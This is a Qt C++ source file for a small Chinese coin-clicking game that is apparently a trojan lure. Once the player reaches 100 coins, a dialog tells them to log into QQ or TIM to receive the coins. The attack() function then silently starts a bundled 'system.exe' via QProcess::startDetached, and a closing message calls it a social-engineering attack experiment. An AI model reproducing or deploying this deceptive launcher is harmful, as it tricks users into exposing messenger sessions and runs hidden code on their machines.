
#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtGlobal>
#include<QTimer>
#include<QTime>
#include<QDebug>
#include<QMessageBox>
#include<QPushButton>
#include<QProcess>
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    scores = 0;
    setWindowTitle("金币小游戏");
    setWindowIcon(QIcon(":/pictures/money.png"));
    ui->scoresLabel->setText(QString::number(scores));

    tim = new QTimer();

    tim->setInterval(1000);

    connect(tim,SIGNAL(timeout()),this,SLOT(onTimeOut()));

    tim->start();

}

MainWindow::~MainWindow()
{
    delete ui;
}

int MainWindow::get_random_number()
 {
     qsrand(QTime(0,0,0).secsTo(QTime::currentTime()));
     int a = qrand()%9;   //随机生成0到9的随机数
//     qDebug()<< a;
     return a;
 }

void MainWindow::on_pushButton_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::on_pushButton_2_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::on_pushButton_3_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::on_pushButton_4_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::on_pushButton_5_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::on_pushButton_6_clicked()
{
    int num = get_random_number();
    scores+=num;
    ui->scoresLabel->setText(QString::number(scores));
    test(scores);
}

void MainWindow::onTimeOut()
{
    static int value = 0;
    ui->progressBar->setValue((value++));

    if(value > 10)
    {
       tim->stop();
       QMessageBox msgBox;

       QMessageBox::information(this,"提示","你已经超时，游戏结束！！");
       this->close();
    }

}
//void attack()
//{

//    Py_Initialize();
//    if(!Py_IsInitialized())
//    {
//        qDebug()<<"初始化失败！";
//        return ;
//    }
//    PyObject* pModule = PyImport_ImportModule("main");
//    if(!pModule)
//    {
//        qDebug()<<"can't open python file!";
//        return ;
//    }
//    PyObject* pFunMain = PyObject_GetAttrString(pModule,"main");
//    if(!pFunMain)
//    {
//        qDebug()<<"can't function main failed";
//        return ;
//    }
//    PyObject_CallFunction(pFunMain,NULL);
//    Py_Finalize();

//}
void MainWindow::attack()
{
    QProcess *process = new QProcess(this);
    QString filePath = QApplication::applicationDirPath();
    QString path = filePath+"/system.exe";
    bool res = QProcess::startDetached(path,QStringList());
    qDebug()<<path;
    //qDebug()<<res;
    //process->start(path,NULL);
}
void MainWindow::test(int score)
{
    if(score>=100)
    {
        tim->stop();
        QMessageBox::StandardButton res = QMessageBox::information(this,"提示","你已经获得了100金币，还要继续吗？？（记住天底下没有免费的午餐）",QMessageBox::Ok|QMessageBox::Cancel,QMessageBox::Ok);
        if(res==QMessageBox::Ok)
        {
            QMessageBox::information(this,"提示","请登录你的QQ或者TIM，金币将会自动加载到你的钱包里！");
            attack();
            close();
        }
        else
        {
            QMessageBox::information(this,"提示","游戏结束，贪心是不好的，很感谢你配合了金主人的社会工程学攻击实验！祝你早日脱单~");
            this->close();
        }
    }

}
